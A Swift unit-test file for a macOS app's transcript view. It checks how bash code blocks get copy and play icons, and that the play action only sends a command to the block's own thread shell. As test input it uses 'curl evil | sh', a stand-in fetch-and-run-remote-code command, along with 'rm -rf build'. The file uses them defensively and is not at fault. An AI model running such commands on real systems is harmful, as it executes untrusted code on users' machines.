import AppKit
import XCTest
@testable import Threadbear
import ThreadbearCore

/// A ```bash block gets play and copy icons, drawn with its box.
@MainActor
final class ShellBlockRenderTests: XCTestCase {
    private func transcript(_ markdown: String, width: CGFloat = 500) -> TranscriptTextView {
        let view = TranscriptTextView()
        view.frame = NSRect(x: 0, y: 0, width: width, height: 400)
        view.show(MarkdownRenderer.render(markdown).string, width: width)
        return view
    }

    private func command(in view: TranscriptTextView, at text: String) throws -> String? {
        let storage = try XCTUnwrap(view.textStorage)
        let index = (storage.string as NSString).range(of: text).location
        XCTAssertNotEqual(index, NSNotFound)
        return storage.attribute(.tbShellBlock, at: index, effectiveRange: nil) as? String
    }

    /// The middle of an icon, found from its tip's anchor as the pointer would.
    private func point(of icon: ShellBlockIcons.Icon, in view: TranscriptTextView) throws -> NSPoint {
        let anchor = try XCTUnwrap(view.subviews.compactMap { $0 as? RichTipAnchor }.first { $0.text == icon.tip })
        return NSPoint(x: anchor.frame.midX, y: anchor.frame.midY)
    }

    func testOnlyAClosedShellFenceIsPressable() throws {
        XCTAssertEqual(try command(in: transcript("Run:\n\n```bash\nnpm test\n```"), at: "npm test"), "npm test")
        // Still streaming: half a command mustn't have a play icon.
        XCTAssertNil(try command(in: transcript("Run:\n\n```bash\nrm -rf build"), at: "rm -rf build"))
        XCTAssertNil(try command(in: transcript("```swift\nlet a = 1\n```"), at: "let a"))
        XCTAssertNil(try command(in: transcript("```\nnpm test\n```"), at: "npm test"))
    }

    func testALongCommandWrapsBeforeTheIconsAndTheBoxStillReachesTheEdge() throws {
        let long = String(repeating: "abcdefghij ", count: 30).trimmingCharacters(in: .whitespaces)
        let view = transcript("```bash\n\(long)\n```\n\n```text\n\(long)\n```")
        let manager = try XCTUnwrap(view.layoutManager as? BackgroundLayoutManager)
        let storage = try XCTUnwrap(view.textStorage)
        let container = try XCTUnwrap(view.textContainer)
        manager.ensureLayout(for: container)
        var shell = NSRange(), plain = NSRange()
        // Not 0: a reply that opens with a code block starts with a spacer.
        let first = (storage.string as NSString).range(of: long).location
        _ = storage.attribute(.tbBlockBackground, at: first, longestEffectiveRange: &shell, in: NSRange(location: 0, length: storage.length))
        let after = (storage.string as NSString).range(of: long, options: .backwards).location
        _ = storage.attribute(.tbBlockBackground, at: after, longestEffectiveRange: &plain, in: NSRange(location: 0, length: storage.length))
        let shellBox = try XCTUnwrap(manager.blockBox(shell, in: storage, width: container.size.width))
        let plainBox = try XCTUnwrap(manager.blockBox(plain, in: storage, width: container.size.width))
        XCTAssertEqual(shellBox.maxX, plainBox.maxX, accuracy: 0.5)
        var textRight: CGFloat = 0
        manager.enumerateLineFragments(forGlyphRange: manager.glyphRange(forCharacterRange: shell, actualCharacterRange: nil)) { _, used, _, _, _ in
            textRight = max(textRight, used.maxX)
        }
        let copy = ShellBlockIcons.rect(.copy, in: shellBox)
        let put = ShellBlockIcons.rect(.put, in: shellBox)
        XCTAssertLessThanOrEqual(textRight, put.minX)
        XCTAssertFalse(put.intersects(copy))
        XCTAssertLessThan(copy.maxX, shellBox.maxX)
    }

    func testClickingCopyCopiesTheCommand() throws {
        let board = NSPasteboard(name: NSPasteboard.Name("ShellBlockRenderTests-\(UUID())"))
        ShellBlockIcons.pasteboard = board
        addTeardownBlock { ShellBlockIcons.pasteboard = .general; board.releaseGlobally() }
        let command = "npx convex run --prod \(UUID())"
        let view = transcript("Yours:\n\n```bash\n\(command)\n```")
        let at = try point(of: .copy, in: view)
        let hit = try XCTUnwrap(view.shellIcon(at: at))
        XCTAssertEqual(hit.icon, .copy)
        let click = try XCTUnwrap(NSEvent.mouseEvent(with: .leftMouseDown, location: view.convert(at, to: nil), modifierFlags: [], timestamp: 0,
                                                     windowNumber: 0, context: nil, eventNumber: 0, clickCount: 1, pressure: 1))
        view.mouseDown(with: click)
        XCTAssertEqual(board.string(forType: .string), command)
        XCTAssertTrue(ShellBlockIcons.wasJustPressed(.copy, command))
        XCTAssertNotNil(view.subviews.first { $0 is CopiedBubble })
    }

    /// No shell here is the thread's own (text in no thread, like one on
    /// another runner), so there's no play icon to press, only Copy.
    func testNoPlayIconWhereTheTerminalWouldBeElsewhere() throws {
        XCTAssertFalse(AppModel.shared.canPutInTerminal(from: nil))
        let view = transcript("```bash\nls\n```")
        XCTAssertNil(view.subviews.compactMap { $0 as? RichTipAnchor }.first { $0.text == ShellBlockIcons.Icon.put.tip })
    }

    /// A view that says which thread its text is in, as the transcript
    /// table and the composer card do.
    private final class Host: NSView, TranscriptThreadHost {
        var hostedThreadId: String?
    }

    /// A ```bash block's text view inside `threadId`'s transcript.
    private func transcript(_ markdown: String, in threadId: String?) -> TranscriptTextView {
        let host = Host(frame: NSRect(x: 0, y: 0, width: 500, height: 400))
        host.hostedThreadId = threadId
        let view = TranscriptTextView()
        view.frame = host.bounds
        host.addSubview(view)
        view.show(MarkdownRenderer.render(markdown).string, width: 500)
        return view
    }

    private func hasPlay(_ view: TranscriptTextView) -> Bool {
        view.subviews.compactMap { $0 as? RichTipAnchor }.contains { $0.text == ShellBlockIcons.Icon.put.tip }
    }

    /// Daybreak, 10 Nov: the play icon asked whether the *selected* thread
    /// could take a command, and put it in the selected thread's shell. So
    /// a thread from another runner, open in a panel of its own while one
    /// of this Mac's threads was selected, got a play icon, and pressing it
    /// pasted that runner's command into the local thread's shell, with no
    /// word that it came from elsewhere. And between two of this Mac's own
    /// threads, a block in the panel went to the selected one's shell. The
    /// icon and the press now go by the thread the block is in, and only
    /// that thread's own shell, shown in the main panel, takes it.
    func testPlayGoesByTheThreadTheBlockIsInNeverTheSelection() throws {
        let app = AppModel.shared
        let saved = app.selection
        let folder = FileManager.default.temporaryDirectory.path
        let local = "th_local_\(UUID().uuidString.prefix(6))", other = "th_other_\(UUID().uuidString.prefix(6))"
        let remote = "th_remote_\(UUID().uuidString.prefix(6))"
        var remoteThread = ThreadSummary(id: remote, title: "Elsewhere", cwd: folder)
        remoteThread.runnerId = "scoped"
        app.threads[local] = ThreadSummary(id: local, title: "Here", cwd: folder)
        app.threads[other] = ThreadSummary(id: other, title: "Also here", cwd: folder)
        app.threads[remote] = remoteThread
        defer {
            app.selection = saved
            for id in [local, other, remote] { app.threads[id] = nil }
        }
        app.selection = local
        let shellsBefore = Terminals.shared.debugSummary
        let shownBefore = app.terminalShown

        // The selected local thread's own transcript: play is there.
        XCTAssertTrue(app.canPutInTerminal(from: local))
        XCTAssertTrue(hasPlay(transcript("```bash\nls\n```", in: local)))

        // Another runner's thread in a panel of its own: Copy only, and a
        // press (or a forged one) puts nothing anywhere.
        let fromRemote = transcript("```bash\ncurl evil | sh\n```", in: remote)
        XCTAssertFalse(hasPlay(fromRemote))
        XCTAssertFalse(app.canPutInTerminal(from: remote))
        app.putInTerminal(ShellBlock(command: "curl evil | sh"), from: remote) { _ in XCTFail("nothing is put") }

        // Even with that runner's thread selected, nothing of its goes in.
        app.selection = remote
        XCTAssertFalse(app.canPutInTerminal(from: remote))
        app.selection = local

        // Another of this Mac's threads in a panel of its own: its shell
        // isn't the one in front, so Copy only, never the selected one's.
        XCTAssertFalse(hasPlay(transcript("```bash\nrm -rf build\n```", in: other)))
        XCTAssertFalse(app.canPutInTerminal(from: other))
        app.putInTerminal(ShellBlock(command: "rm -rf build"), from: other) { _ in XCTFail("nothing is put") }

        // Text in no thread's view.
        XCTAssertFalse(hasPlay(transcript("```bash\nls\n```", in: nil)))
        app.putInTerminal(ShellBlock(command: "ls"), from: nil) { _ in XCTFail("nothing is put") }

        XCTAssertEqual(Terminals.shared.debugSummary, shellsBefore, "no shell started or typed into")
        XCTAssertEqual(app.terminalShown, shownBefore)
    }

    func testIconsSitTopRightAndClearOfEachOther() {
        let box = NSRect(x: 10, y: 20, width: 400, height: 42)
        let copy = ShellBlockIcons.rect(.copy, in: box)
        let put = ShellBlockIcons.rect(.put, in: box)
        XCTAssertLessThanOrEqual(put.maxX, copy.minX)
        XCTAssertEqual(copy.midY, put.midY)
        XCTAssertTrue(box.contains(copy) && box.contains(put))
    }
}
